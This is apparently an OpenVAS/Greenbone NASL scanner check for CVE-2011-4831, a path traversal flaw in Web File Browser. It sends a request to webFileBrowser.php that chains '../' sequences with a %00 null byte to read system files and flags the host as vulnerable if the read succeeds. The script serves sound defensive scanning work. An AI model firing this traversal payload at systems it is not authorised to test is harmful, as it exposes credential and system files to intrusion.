if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802341" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2011-4831" );
	script_bugtraq_id( 50508 );
	script_tag( name: "cvss_base", value: "4.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-11-08 17:09:26 +0530 (Tue, 08 Nov 2011)" );
	script_name( "Web File Browser 'act' Parameter File Download Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/71131" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18070/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50508/exploit" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to download and
  read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Web File Browser versions 0.4b14 and prior" );
	script_tag( name: "insight", value: "The flaw is due to input validation error in 'act' parameter in
  'webFileBrowser.php', which allows attackers to download arbitrary files via a '../'(dot dot) sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running with Web File Browser and is prone to
  file download vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/webFileBrowser", "/webfilebrowser", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: dir + "/webFileBrowser.php", port: port );
	rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
	if(ContainsString( rcvRes, "<title>Web File Browser" )){
		for file in keys( files ) {
			url = NASLString( dir, "/webFileBrowser.php?act=download&subdir=&sortby=name&file=", crap( data: "../", length: 6 * 9 ), files[file], "%00" );
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

